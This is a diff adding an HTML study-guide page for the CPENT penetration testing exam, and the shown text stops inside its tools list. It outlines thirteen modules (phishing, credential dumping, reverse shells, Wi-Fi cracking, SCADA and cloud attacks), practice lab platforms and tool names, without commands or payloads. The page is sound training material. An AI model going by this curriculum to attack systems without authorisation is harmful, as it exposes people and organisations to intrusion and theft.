@@ -1,0 +1,1968 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CPENT Study Guide | Complete Penetration Testing Resource</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="bg-animation" id="bgAnimation"></div>
+    <div class="grid-bg"></div>
+    <div class="glow glow-1"></div>
+    <div class="glow glow-2"></div>
+
+    <!-- Navigation -->
+    <nav id="navbar">
+        <div class="nav-logo">CPENT<span>Lab</span></div>
+        <ul class="nav-links" id="navLinks">
+            <li><a href="#home">Home</a></li>
+            <li><a href="#about">About</a></li>
+            <li><a href="#modules">Modules</a></li>
+            <li><a href="#exam-zones">Exam Zones</a></li>
+            <li><a href="#privesc">Privesc & AD</a></li>
+            <li><a href="#labs">Labs</a></li>
+            <li><a href="#cheatsheets">Cheat Sheets</a></li>
+            <li><a href="#tools">Tools</a></li>
+            <li><a href="#resources">Resources</a></li>
+            <li><a href="#study-plan">Study Plan</a></li>
+            <li><a href="#exam-process">Exam Day</a></li>
+            <li><a href="#report-writing">Report</a></li>
+            <li><a href="#faq">FAQ</a></li>
+            <li><a href="#tips">Tips</a></li>
+        </ul>
+        <div class="hamburger" id="hamburger">
+            <span></span><span></span><span></span>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="hero" id="home">
+        <div class="hero-content">
+            <div class="hero-badge">
+                <i class="fas fa-shield-halved"></i>
+                EC-Council Certified Penetration Testing Engineer
+            </div>
+            <h1>Master <span class="gradient-text">Penetration Testing</span> with CPENT</h1>
+            <p>Your complete guide to passing the CPENT exam. All modules, labs, tools, and study resources in one place.</p>
+            <div class="hero-buttons">
+                <a href="#modules" class="btn btn-primary">
+                    <i class="fas fa-book-open"></i> Explore Modules
+                </a>
+                <a href="#labs" class="btn btn-secondary">
+                    <i class="fas fa-flask"></i> Practice Labs
+                </a>
+                <a href="#study-plan" class="btn btn-secondary">
+                    <i class="fas fa-calendar-alt"></i> Study Plan
+                </a>
+            </div>
+            <div class="hero-stats">
+                <div class="stat">
+                    <div class="stat-number">13</div>
+                    <div class="stat-label">Modules</div>
+                </div>
+                <div class="stat">
+                    <div class="stat-number">40+</div>
+                    <div class="stat-label">Tools</div>
+                </div>
+                <div class="stat">
+                    <div class="stat-number">15+</div>
+                    <div class="stat-label">Lab Platforms</div>
+                </div>
+                <div class="stat">
+                    <div class="stat-number">100%</div>
+                    <div class="stat-label">Practical</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Modules Section -->
+    <section id="modules">
+        <div class="section-header reveal">
+            <div class="section-tag">Curriculum</div>
+            <h2>CPENT Modules</h2>
+            <p>Click on any module to expand details. Check modules as you complete them.</p>
+        </div>
+
+        <!-- Progress Tracker -->
+        <div class="progress-section reveal">
+            <div class="progress-label">
+                <span>Progress</span>
+                <span id="progressText">0 / 13 completed</span>
+            </div>
+            <div class="progress-bar-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+        </div>
+
+        <div class="modules-grid" style="margin-top: 2rem;">
+            <!-- Module 01 -->
+            <div class="module-card reveal" data-module="01">
+                <div class="module-check" onclick="toggleModule(this, event)"></div>
+                <div class="module-header">
+                    <div class="module-icon blue"><i class="fas fa-book"></i></div>
+                    <div>
+                        <div class="module-number">Module 01</div>
+                        <div class="module-title">Introduction to Penetration Testing</div>
+                    </div>
+                </div>
+                <div class="module-desc">Understand the fundamentals of penetration testing, methodologies, and legal frameworks.</div>
+                <div class="module-topics">
+                    <span class="topic-tag">PTES</span>
+                    <span class="topic-tag">OWASP</span>
+                    <span class="topic-tag">Rules of Engagement</span>
+                    <span class="topic-tag">Scoping</span>
+                    <span class="topic-tag">Methodology</span>
+                </div>
+                <div class="module-tools">
+                    <span class="tool-tag">NIST Framework</span>
+                    <span class="tool-tag">OSSTMM</span>
+                </div>
+                <button class="expand-btn" onclick="toggleExpand(this)">View Details <i class="fas fa-chevron-down"></i></button>
+                <div class="module-details">
+                    <h4>Key Topics:</h4>
+                    <ul>
+                        <li>Penetration testing phases and lifecycle</li>
+                        <li>Types: black box, white box, gray box</li>
+                        <li>Rules of engagement and legal compliance</li>
+                        <li>Scoping and methodology selection</li>
+                        <li>Documentation and reporting standards</li>
+                    </ul>
+                    <h4>Frameworks to Know:</h4>
+                    <ul>
+                        <li>PTES (Penetration Testing Execution Standard)</li>
+                        <li>OWASP Testing Guide</li>
+                        <li>NIST SP 800-115</li>
+                        <li>OSSTMM</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Module 02 -->
+            <div class="module-card reveal" data-module="02">
+                <div class="module-check" onclick="toggleModule(this, event)"></div>
+                <div class="module-header">
+                    <div class="module-icon purple"><i class="fas fa-user-shield"></i></div>
+                    <div>
+                        <div class="module-number">Module 02</div>
+                        <div class="module-title">Ethical Hacking & Legal Issues</div>
+                    </div>
+                </div>
+                <div class="module-desc">Master ethical hacking principles, legal considerations, and professional conduct.</div>
+                <div class="module-topics">
+                    <span class="topic-tag">Ethics</span>
+                    <span class="topic-tag">Laws & Regulations</span>
+                    <span class="topic-tag">NDAs</span>
+                    <span class="topic-tag">Compliance</span>
+                    <span class="topic-tag">Professional Conduct</span>
+                </div>
+                <div class="module-tools">
+                    <span class="tool-tag">CFAA</span>
+                    <span class="tool-tag">GDPR</span>
+                    <span class="tool-tag">HIPAA</span>
+                </div>
+                <button class="expand-btn" onclick="toggleExpand(this)">View Details <i class="fas fa-chevron-down"></i></button>
+                <div class="module-details">
+                    <h4>Key Topics:</h4>
+                    <ul>
+                        <li>Authorized vs unauthorized testing</li>
+                        <li>Computer fraud and abuse laws (CFAA)</li>
+                        <li>Data protection regulations (GDPR, HIPAA)</li>
+                        <li>Non-disclosure agreements</li>
+                        <li>Professional code of ethics</li>
+                    </ul>
+                    <h4>Legal Frameworks:</h4>
+                    <ul>
+                        <li>US: CFAA, DMCA, ECPA</li>
+                        <li>EU: GDPR, NIS Directive</li>
+                        <li>International: Budapest Convention</li>
+                        <li>Industry: PCI DSS, SOX compliance</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Module 03 -->
+            <div class="module-card reveal" data-module="03">
+                <div class="module-check" onclick="toggleModule(this, event)"></div>
+                <div class="module-header">
+                    <div class="module-icon blue"><i class="fas fa-search"></i></div>
+                    <div>
+                        <div class="module-number">Module 03</div>
+                        <div class="module-title">Open Source Intelligence (OSINT)</div>
+                    </div>
+                </div>
+                <div class="module-desc">Gather and analyze publicly available information about targets using advanced search techniques.</div>
+                <div class="module-topics">
+                    <span class="topic-tag">Google Dorking</span>
+                    <span class="topic-tag">Shodan</span>
+                    <span class="topic-tag">Censys</span>
+                    <span class="topic-tag">Subdomain Enum</span>
+                    <span class="topic-tag">Email Harvesting</span>
+                </div>
+                <div class="module-tools">
+                    <span class="tool-tag">subfinder</span>
+                    <span class="tool-tag">amass</span>
+                    <span class="tool-tag">theHarvester</span>
+                    <span class="tool-tag">Maltego</span>
+                    <span class="tool-tag">Recon-ng</span>
+                </div>
+                <button class="expand-btn" onclick="toggleExpand(this)">View Details <i class="fas fa-chevron-down"></i></button>
+                <div class="module-details">
+                    <h4>Lab Practice:</h4>
+                    <ul>
+                        <li>Perform subdomain enumeration on a target domain</li>
+                        <li>Use Google dorks to find exposed files and directories</li>
+                        <li>Harvest emails and credentials from public sources</li>
+                        <li>Map organization infrastructure with Shodan</li>
+                        <li>Create OSINT profile using Maltego</li>
+                    </ul>
+                    <h4>Key Skills:</h4>
+                    <ul>
+                        <li>Social media intelligence gathering</li>
+                        <li>WHOIS and DNS analysis</li>
+                        <li>Web archive analysis (Wayback Machine)</li>
+                        <li>Public record and data breach searches</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Module 04 -->
+            <div class="module-card reveal" data-module="04">
+                <div class="module-check" onclick="toggleModule(this, event)"></div>
+                <div class="module-header">
+                    <div class="module-icon purple"><i class="fas fa-user-secret"></i></div>
+                    <div>
+                        <div class="module-number">Module 04</div>
+                        <div class="module-title">Social Engineering Penetration Testing</div>
+                    </div>
+                </div>
+                <div class="module-desc">Master the art of manipulating humans through phishing, pretexting, and psychological techniques.</div>
+                <div class="module-topics">
+                    <span class="topic-tag">Phishing</span>
+                    <span class="topic-tag">Pretexting</span>
+                    <span class="topic-tag">Vishing</span>
+                    <span class="topic-tag">Baiting</span>
+                    <span class="topic-tag">Credential Harvesting</span>
+                </div>
+                <div class="module-tools">
+                    <span class="tool-tag">SET</span>
+                    <span class="tool-tag">GoPhish</span>
+                    <span class="tool-tag">King Phisher</span>
+                    <span class="tool-tag">Evilginx2</span>
+                </div>
+                <button class="expand-btn" onclick="toggleExpand(this)">View Details <i class="fas fa-chevron-down"></i></button>
+                <div class="module-details">
+                    <h4>Lab Practice:</h4>
+                    <ul>
+                        <li>Build phishing campaign with SET Toolkit</li>
+                        <li>Create credential harvesting page</li>
+                        <li>Design pretexting scenarios</li>
+                        <li>Simulate USB baiting attacks</li>
+                        <li>Analyze employee security awareness</li>
+                    </ul>
+                    <h4>Key Skills:</h4>
+                    <ul>
+                        <li>Email spoofing and domain impersonation</li>
+                        <li>Social media profiling</li>
+                        <li>In-person physical social engineering</li>
+                        <li>Creating convincing pretext scenarios</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Module 05 -->
+            <div class="module-card reveal" data-module="05">
+                <div class="module-check" onclick="toggleModule(this, event)"></div>
+                <div class="module-header">
+                    <div class="module-icon green"><i class="fas fa-network-wired"></i></div>
+                    <div>
+                        <div class="module-number">Module 05</div>
+                        <div class="module-title">Network Penetration Testing — External</div>
+                    </div>
+                </div>
+                <div class="module-desc">Attack external-facing infrastructure through recon, enumeration, exploitation, and post-exploitation.</div>
+                <div class="module-topics">
+                    <span class="topic-tag">Port Scanning</span>
+                    <span class="topic-tag">Service Enum</span>
+                    <span class="topic-tag">Exploitation</span>
+                    <span class="topic-tag">Reverse Shells</span>
+                    <span class="topic-tag">Privesc</span>
+                </div>
+                <div class="module-tools">
+                    <span class="tool-tag">Nmap</span>
+                    <span class="tool-tag">Metasploit</span>
+                    <span class="tool-tag">Netcat</span>
+                    <span class="tool-tag">MSFvenom</span>
+                    <span class="tool-tag">Gobuster</span>
+                </div>
+                <button class="expand-btn" onclick="toggleExpand(this)">View Details <i class="fas fa-chevron-down"></i></button>
+                <div class="module-details">
+                    <h4>Lab Practice:</h4>
+                    <ul>
+                        <li>Full network scan with Nmap (SYN, TCP, UDP)</li>
+                        <li>Service and version enumeration</li>
+                        <li>Exploit vulnerable services with Metasploit</li>
+                        <li>Establish reverse shell connections</li>
+                        <li>Linux/Windows privilege escalation</li>
+                    </ul>
+                    <h4>Key Skills:</h4>
+                    <ul>
+                        <li>Ping sweeps and host discovery</li>
+                        <li>Banner grabbing and fingerprinting</li>
+                        <li>Payload generation with MSFvenom</li>
+                        <li>Staged vs stageless shells</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Module 06 -->
+            <div class="module-card reveal" data-module="06">
+                <div class="module-check" onclick="toggleModule(this, event)"></div>
+                <div class="module-header">
+                    <div class="module-icon red"><i class="fas fa-server"></i></div>
+                    <div>
+                        <div class="module-number">Module 06</div>
+                        <div class="module-title">Network Penetration Testing — Internal</div>
+                    </div>
+                </div>
+                <div class="module-desc">Compromise internal networks through MiTM attacks, lateral movement, and credential dumping.</div>
+                <div class="module-topics">
+                    <span class="topic-tag">ARP Spoofing</span>
+                    <span class="topic-tag">MitM</span>
+                    <span class="topic-tag">Credential Dumping</span>
+                    <span class="topic-tag">Lateral Movement</span>
+                    <span class="topic-tag">Pass-the-Hash</span>
+                </div>
+                <div class="module-tools">
+                    <span class="tool-tag">Responder</span>
+                    <span class="tool-tag">Mimikatz</span>
+                    <span class="tool-tag">Impacket</span>
+                    <span class="tool-tag">BloodHound</span>
+                    <span class="tool-tag">Bettercap</span>
+                </div>
+                <button class="expand-btn" onclick="toggleExpand(this)">View Details <i class="fas fa-chevron-down"></i></button>
+                <div class="module-details">
+                    <h4>Lab Practice:</h4>
+                    <ul>
+                        <li>ARP spoofing and traffic interception</li>
+                        <li>LLMNR/NBT-NS poisoning with Responder</li>
+                        <li>NTLM hash capture and cracking</li>
+                        <li>Pass-the-Hash attacks with Impacket</li>
+                        <li>Active Directory enumeration with BloodHound</li>
+                    </ul>
+                    <h4>Key Skills:</h4>
+                    <ul>
+                        <li>Network traffic analysis</li>
+                        <li>Credential harvesting techniques</li>
+                        <li>Kerberos attacks (Kerberoasting, AS-REP)</li>
+                        <li>Domain enumeration and escalation paths</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Module 07 -->
+            <div class="module-card reveal" data-module="07">
+                <div class="module-check" onclick="toggleModule(this, event)"></div>
+                <div class="module-header">
+                    <div class="module-icon orange"><i class="fas fa-shield-halved"></i></div>
+                    <div>
+                        <div class="module-number">Module 07</div>
+                        <div class="module-title">Network Pen Testing — Perimeter Devices</div>
+                    </div>
+                </div>
+                <div class="module-desc">Bypass firewalls, IDS/IPS, and test router/switch security with advanced evasion techniques.</div>
+                <div class="module-topics">
+                    <span class="topic-tag">Firewall Bypass</span>
+                    <span class="topic-tag">IDS/IPS Evasion</span>
+                    <span class="topic-tag">SNMP Attacks</span>
+                    <span class="topic-tag">SSH Tunneling</span>
+                    <span class="topic-tag">VLAN Hopping</span>
+                </div>
+                <div class="module-tools">
+                    <span class="tool-tag">Hping3</span>
+                    <span class="tool-tag">Fragroute</span>
+                    <span class="tool-tag">Proxifier</span>
+                    <span class="tool-tag">Chisel</span>
+                    <span class="tool-tag">socat</span>
+                </div>
+                <button class="expand-btn" onclick="toggleExpand(this)">View Details <i class="fas fa-chevron-down"></i></button>
+                <div class="module-details">
+                    <h4>Lab Practice:</h4>
+                    <ul>
+                        <li>Firewall rule analysis and bypass</li>
+                        <li>Fragmentation and IP spoofing attacks</li>
+                        <li>SSH/HTTP tunneling for pivoting</li>
+                        <li>SNMP community string enumeration</li>
+                        <li>Port forwarding and proxy chains</li>
+                    </ul>
+                    <h4>Key Skills:</h4>
+                    <ul>
+                        <li>Nmap firewall evasion scripts</li>
+                        <li>Encrypted tunnel creation</li>
+                        <li>Network segmentation testing</li>
+                        <li>Covert channel communication</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Module 08 -->
+            <div class="module-card reveal" data-module="08">
+                <div class="module-check" onclick="toggleModule(this, event)"></div>
+                <div class="module-header">
+                    <div class="module-icon blue"><i class="fas fa-globe"></i></div>
+                    <div>
+                        <div class="module-number">Module 08</div>
+                        <div class="module-title">Web Application Penetration Testing</div>
+                    </div>
+                </div>
+                <div class="module-desc">Master OWASP Top 10 vulnerabilities including SQLi, XSS, SSRF, and advanced web attacks.</div>
+                <div class="module-topics">
+                    <span class="topic-tag">SQL Injection</span>
+                    <span class="topic-tag">XSS</span>
+                    <span class="topic-tag">SSRF</span>
+                    <span class="topic-tag">IDOR</span>
+                    <span class="topic-tag">File Upload</span>
+                    <span class="topic-tag">Command Injection</span>
+                </div>
+                <div class="module-tools">
+                    <span class="tool-tag">Burp Suite</span>
+                    <span class="tool-tag">sqlmap</span>
+                    <span class="tool-tag">Nikto</span>
+                    <span class="tool-tag">ffuf</span>
+                    <span class="tool-tag">WPScan</span>
+                </div>
+                <button class="expand-btn" onclick="toggleExpand(this)">View Details <i class="fas fa-chevron-down"></i></button>
+                <div class="module-details">
+                    <h4>Lab Practice:</h4>
+                    <ul>
+                        <li>SQL injection (union, blind, time-based)</li>
+                        <li>Reflected, stored, and DOM-based XSS</li>
+                        <li>SSRF to internal services</li>
+                        <li>Insecure direct object references</li>
+                        <li>File upload bypass and webshell execution</li>
+                    </ul>
+                    <h4>Key Skills:</h4>
+                    <ul>
+                        <li>Burp Suite workflow (proxy, repeater, intruder)</li>
+                        <li>Automated and manual testing</li>
+                        <li>Authentication/authorization bypass</li>
+                        <li>API security testing</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Module 09 -->
+            <div class="module-card reveal" data-module="09">
+                <div class="module-check" onclick="toggleModule(this, event)"></div>
+                <div class="module-header">
+                    <div class="module-icon purple"><i class="fas fa-wifi"></i></div>
+                    <div>
+                        <div class="module-number">Module 09</div>
+                        <div class="module-title">Wireless Penetration Testing</div>
+                    </div>
+                </div>
+                <div class="module-desc">Crack WPA2, perform evil twin attacks, and exploit wireless network vulnerabilities.</div>
+                <div class="module-topics">
+                    <span class="topic-tag">WPA2 Cracking</span>
+                    <span class="topic-tag">Evil Twin</span>
+                    <span class="topic-tag">WPS Attack</span>
+                    <span class="topic-tag">Bluetooth</span>
+                    <span class="topic-tag">Rogue AP</span>
+                </div>
+                <div class="module-tools">
+                    <span class="tool-tag">Aircrack-ng</span>
+                    <span class="tool-tag">Wifite</span>
+                    <span class="tool-tag">Fluxion</span>
+                    <span class="tool-tag">Bettercap</span>
+                    <span class="tool-tag">hcxdumptool</span>
+                </div>
+                <button class="expand-btn" onclick="toggleExpand(this)">View Details <i class="fas fa-chevron-down"></i></button>
+                <div class="module-details">
+                    <h4>Lab Practice:</h4>
+                    <ul>
+                        <li>Capture WPA2 handshake and crack with wordlist</li>
+                        <li>Create evil twin access point</li>
+                        <li>Deauthentication attacks</li>
+                        <li>WPS PIN brute force</li>
+                        <li>Bluetooth device enumeration</li>
+                    </ul>
+                    <h4>Key Skills:</h4>
+                    <ul>
+                        <li>Monitor mode and packet capture</li>
+                        <li>Dictionary and rule-based attacks</li>
+                        <li>Captive portal attacks</li>
+                        <li>Wireless network isolation</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Module 10 -->
+            <div class="module-card reveal" data-module="10">
+                <div class="module-check" onclick="toggleModule(this, event)"></div>
+                <div class="module-header">
+                    <div class="module-icon green"><i class="fas fa-microchip"></i></div>
+                    <div>
+                        <div class="module-number">Module 10</div>
+                        <div class="module-title">IoT Penetration Testing</div>
+                    </div>
+                </div>
+                <div class="module-desc">Analyze IoT firmware, exploit default credentials, and attack IoT protocols.</div>
+                <div class="module-topics">
+                    <span class="topic-tag">Firmware Analysis</span>
+                    <span class="topic-tag">Default Creds</span>
+                    <span class="topic-tag">MQTT</span>
+                    <span class="topic-tag">CoAP</span>
+                    <span class="topic-tag">Zigbee</span>
+                </div>
+                <div class="module-tools">
+                    <span class="tool-tag">binwalk</span>
+                    <span class="tool-tag">Firmwalker</span>
+                    <span class="tool-tag">IoT Inspector</span>
+                    <span class="tool-tag">Shodan</span>
+                </div>
+                <button class="expand-btn" onclick="toggleExpand(this)">View Details <i class="fas fa-chevron-down"></i></button>
+                <div class="module-details">
+                    <h4>Lab Practice:</h4>
+                    <ul>
+                        <li>Extract and analyze firmware images</li>
+                        <li>Find hardcoded credentials in firmware</li>
+                        <li>MQTT broker exploitation</li>
+                        <li>Default password brute forcing</li>
+                        <li>IoT device network scanning</li>
+                    </ul>
+                    <h4>Key Skills:</h4>
+                    <ul>
+                        <li>Binary analysis and reverse engineering</li>
+                        <li>IoT protocol understanding</li>
+                        <li>Hardware interface identification (UART, JTAG)</li>
+                        <li>Cloud API testing for IoT devices</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Module 11 -->
+            <div class="module-card reveal" data-module="11">
+                <div class="module-check" onclick="toggleModule(this, event)"></div>
+                <div class="module-header">
+                    <div class="module-icon red"><i class="fas fa-industry"></i></div>
+                    <div>
+                        <div class="module-number">Module 11</div>
+                        <div class="module-title">OT/SCADA Penetration Testing</div>
+                    </div>
+                </div>
+                <div class="module-desc">Test industrial control systems, Modbus/DNP3 protocols, and PLC security.</div>
+                <div class="module-topics">
+                    <span class="topic-tag">SCADA</span>
+                    <span class="topic-tag">Modbus</span>
+                    <span class="topic-tag">DNP3</span>
+                    <span class="topic-tag">PLC</span>
+                    <span class="topic-tag">HMI</span>
+                </div>
+                <div class="module-tools">
+                    <span class="tool-tag">GRFICSv2</span>
+                    <span class="tool-tag">radare2</span>
+                    <span class="tool-tag">Nmap NSE</span>
+                    <span class="tool-tag">mbtget</span>
+                </div>
+                <button class="expand-btn" onclick="toggleExpand(this)">View Details <i class="fas fa-chevron-down"></i></button>
+                <div class="module-details">
+                    <h4>Lab Practice:</h4>
+                    <ul>
+                        <li>Set up GRFICSv2 ICS simulation</li>
+                        <li>Modbus protocol enumeration and attacks</li>
+                        <li>PLC program upload/download</li>
+                        <li>HMI exploitation and manipulation</li>
+                        <li>Safety system bypass techniques</li>
+                    </ul>
+                    <h4>Key Skills:</h4>
+                    <ul>
+                        <li>ICS/SCADA protocol analysis</li>
+                        <li>Process manipulation attacks</li>
+                        <li>Historian server exploitation</li>
+                        <li>Operational technology risk assessment</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Module 12 -->
+            <div class="module-card reveal" data-module="12">
+                <div class="module-check" onclick="toggleModule(this, event)"></div>
+                <div class="module-header">
+                    <div class="module-icon yellow"><i class="fas fa-cloud"></i></div>
+                    <div>
+                        <div class="module-number">Module 12</div>
+                        <div class="module-title">Cloud Penetration Testing</div>
+                    </div>
+                </div>
+                <div class="module-desc">Exploit AWS/Azure/GCP misconfigs, container escapes, and serverless vulnerabilities.</div>
+                <div class="module-topics">
+                    <span class="topic-tag">AWS</span>
+                    <span class="topic-tag">Azure</span>
+                    <span class="topic-tag">GCP</span>
+                    <span class="topic-tag">Docker Escape</span>
+                    <span class="topic-tag">Kubernetes</span>
+                </div>
+                <div class="module-tools">
+                    <span class="tool-tag">Pacu</span>
+                    <span class="tool-tag">ScoutSuite</span>
+                    <span class="tool-tag">kube-hunter</span>
+                    <span class="tool-tag">Stratus</span>
+                    <span class="tool-tag">CloudSploit</span>
+                </div>
+                <button class="expand-btn" onclick="toggleExpand(this)">View Details <i class="fas fa-chevron-down"></i></button>
+                <div class="module-details">
+                    <h4>Lab Practice:</h4>
+                    <ul>
+                        <li>S3 bucket enumeration and data exposure</li>
+                        <li>IAM privilege escalation paths</li>
+                        <li>Docker container escape techniques</li>
+                        <li>Kubernetes API server exploitation</li>
+                        <li>Serverless function injection</li>
+                    </ul>
+                    <h4>Key Skills:</h4>
+                    <ul>
+                        <li>Cloud identity and access management</li>
+                        <li>Container security assessment</li>
+                        <li>Infrastructure as Code auditing</li>
+                        <li>Cloud-native attack techniques</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Module 13 -->
+            <div class="module-card reveal" data-module="13">
+                <div class="module-check" onclick="toggleModule(this, event)"></div>
+                <div class="module-header">
+                    <div class="module-icon orange"><i class="fas fa-code"></i></div>
+                    <div>
+                        <div class="module-number">Module 13</div>
+                        <div class="module-title">Binary Analysis & Exploitation</div>
+                    </div>
+                </div>
+                <div class="module-desc">Master buffer overflows, format string bugs, ROP chains, and shellcode development.</div>
+                <div class="module-topics">
+                    <span class="topic-tag">Buffer Overflow</span>
+                    <span class="topic-tag">Format String</span>
+                    <span class="topic-tag">ROP</span>
+                    <span class="topic-tag">Shellcoding</span>
+                    <span class="topic-tag">Heap Exploitation</span>
+                </div>
+                <div class="module-tools">
+                    <span class="tool-tag">GDB/pwndbg</span>
+                    <span class="tool-tag">Ghidra</span>
+                    <span class="tool-tag">radare2</span>
+                    <span class="tool-tag">pwntools</span>
+                    <span class="tool-tag">one_gadget</span>
+                </div>
+                <button class="expand-btn" onclick="toggleExpand(this)">View Details <i class="fas fa-chevron-down"></i></button>
+                <div class="module-details">
+                    <h4>Lab Practice:</h4>
+                    <ul>
+                        <li>Stack-based buffer overflow exploitation</li>
+                        <li>Format string read/write primitives</li>
+                        <li>ROP chain construction</li>
+                        <li>Shellcode injection and encoding</li>
+                        <li>Binary reverse engineering with Ghidra</li>
+                    </ul>
+                    <h4>Key Skills:</h4>
+                    <ul>
+                        <li>Memory layout understanding</li>
+                        <li>ASLR/NX/PIE bypass techniques</li>
+                        <li>Return-oriented programming</li>
+                        <li>Binary patching and crackme solving</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Labs Section -->
+    <section id="labs">
+        <div class="section-header reveal">
+            <div class="section-tag">Practice</div>
+            <h2>Lab Platforms</h2>
+            <p>Hands-on practice is essential. Use these platforms to build your skills.</p>
+        </div>
+        <div class="labs-grid">
+            <a href="https://www.hackthebox.com" target="_blank" class="lab-card reveal">
+                <div class="lab-icon" style="background: rgba(0, 255, 136, 0.15); color: #00ff88;"><i class="fas fa-box"></i></div>
+                <h3>Hack The Box</h3>
+                <p>Real-world vulnerable machines and challenges. Active & retired boxes for all skill levels.</p>
+                <span class="lab-badge badge-paid">Paid (Free Tier Available)</span>
+            </a>
+            <a href="https://tryhackme.com" target="_blank" class="lab-card reveal">
+                <div class="lab-icon" style="background: rgba(0, 212, 255, 0.15); color: #00d4ff;"><i class="fas fa-graduation-cap"></i></div>
+                <h3>TryHackMe</h3>
+                <p>Guided learning paths with browser-based labs. Perfect for beginners to intermediate.</p>
+                <span class="lab-badge badge-paid">Paid (Free Rooms Available)</span>
+            </a>
+            <a href="https://www.vulnhub.com" target="_blank" class="lab-card reveal">
+                <div class="lab-icon" style="background: rgba(255, 149, 0, 0.15); color: #ff9500;"><i class="fas fa-download"></i></div>
+                <h3>VulnHub</h3>
+                <p>Downloadable vulnerable VMs for local practice. Hundreds of machines available.</p>
+                <span class="lab-badge badge-free">Free</span>
+            </a>
+            <a href="https://overthewire.org/wargames/" target="_blank" class="lab-card reveal">
+                <div class="lab-icon" style="background: rgba(255, 51, 102, 0.15); color: #ff3366;"><i class="fas fa-terminal"></i></div>
+                <h3>OverTheWire</h3>
+                <p>Wargames for learning security concepts. Narnia, Behemoth for binary exploitation.</p>
+                <span class="lab-badge badge-free">Free</span>
+            </a>
+            <a href="https://www.dvwa.co.uk" target="_blank" class="lab-card reveal">
+                <div class="lab-icon" style="background: rgba(124, 58, 237, 0.15); color: #7c3aed;"><i class="fas fa-bullseye"></i></div>
+                <h3>DVWA</h3>
+                <p>Damn Vulnerable Web Application. Practice web vulns with varying difficulty levels.</p>
+                <span class="lab-badge badge-free">Free</span>
+            </a>
+            <a href="https://owasp.org/www-project-webgoat/" target="_blank" class="lab-card reveal">
+                <div class="lab-icon" style="background: rgba(255, 214, 10, 0.15); color: #ffd60a;"><i class="fas fa-book"></i></div>
+                <h3>WebGoat</h3>
+                <p>OWASP's teaching tool for web application security. Lessons with guided exercises.</p>
+                <span class="lab-badge badge-free">Free</span>
+            </a>
+            <a href="https://ropemporium.com" target="_blank" class="lab-card reveal">
+                <div class="lab-icon" style="background: rgba(0, 212, 255, 0.15); color: #00d4ff;"><i class="fas fa-link"></i></div>
+                <h3>ROP Emporium</h3>
+                <p>Practice return-oriented programming challenges. Essential for binary exploitation.</p>
+                <span class="lab-badge badge-free">Free</span>
+            </a>
+            <a href="https://exploit.education" target="_blank" class="lab-card reveal">
+                <div class="lab-icon" style="background: rgba(0, 255, 136, 0.15); color: #00ff88;"><i class="fas fa-flask"></i></div>
+                <h3>Exploit Education</h3>
+                <p>Phoenix, Nebula, and more. Progressive challenges for exploit development.</p>
+                <span class="lab-badge badge-free">Free</span>
+            </a>
+            <a href="https://picoctf.org" target="_blank" class="lab-card reveal">
+                <div class="lab-icon" style="background: rgba(255, 51, 102, 0.15); color: #ff3366;"><i class="fas fa-flag"></i></div>
+                <h3>PicoCTF</h3>
+                <p>CMU's CTF platform. Great for learning binary, crypto, and web challenges.</p>
+                <span class="lab-badge badge-free">Free</span>
+            </a>
+            <a href="https://portswigger.net/web-security" target="_blank" class="lab-card reveal">
+                <div class="lab-icon" style="background: rgba(124, 58, 237, 0.15); color: #7c3aed;"><i class="fas fa-spider"></i></div>
+                <h3>PortSwigger Labs</h3>
+                <p>Burp Suite's official web security academy. 100+ hands-on labs for web vulns.</p>
+                <span class="lab-badge badge-free">Free</span>
+            </a>
+            <a href="https://www.root-me.org" target="_blank" class="lab-card reveal">
+                <div class="lab-icon" style="background: rgba(255, 149, 0, 0.15); color: #ff9500;"><i class="fas fa-user-ninja"></i></div>
+                <h3>Root Me</h3>
+                <p>Multi-challenge platform covering web, network, crypto, and reverse engineering.</p>
+                <span class="lab-badge badge-free">Free</span>
+            </a>
+            <a href="https://labs.hackthebox.com" target="_blank" class="lab-card reveal">
+                <div class="lab-icon" style="background: rgba(0, 212, 255, 0.15); color: #00d4ff;"><i class="fas fa-vial"></i></div>
+                <h3>HTB Pro Labs</h3>
+                <p>Large-scale network environments. Practice enterprise penetration testing.</p>
+                <span class="lab-badge badge-premium">Premium</span>
+            </a>
+        </div>
+    </section>
+
+    <!-- Tools Section -->
+    <section id="tools">
+        <div class="section-header reveal">
+            <div class="section-tag">Arsenal</div>
+            <h2>Essential Tools</h2>
+            <p>Master these tools to succeed in the CPENT exam and real-world engagements.</p>
+        </div>
+        <div class="tools-container">
+            <div class="tool-item reveal">
+                <i class="fas fa-crosshairs"></i>
+                <h4>Nmap</h4>
+                <p>Network scanning</p>
+            </div>
+            <div class="tool-item reveal">
+                <i class="fas fa-bug"></i>
+                <h4>Metasploit</h4>
+                <p>Exploitation framework</p>
+            </div>
+            <div class="tool-item reveal">
+                <i class="fas fa-shield-alt"></i>
+                <h4>Burp Suite</h4>
+                <p>Web app testing</p>
+            </div>
+            <div class="tool-item reveal">
+                <i class="fas fa-database"></i>
+                <h4>sqlmap</h4>
+                <p>SQL injection</p>
+            </div>
+            <div class="tool-item reveal">
+                <i class="fas fa-key"></i>
+                <h4>Hashcat</h4>
+                <p>Password cracking</p>
+            </div>
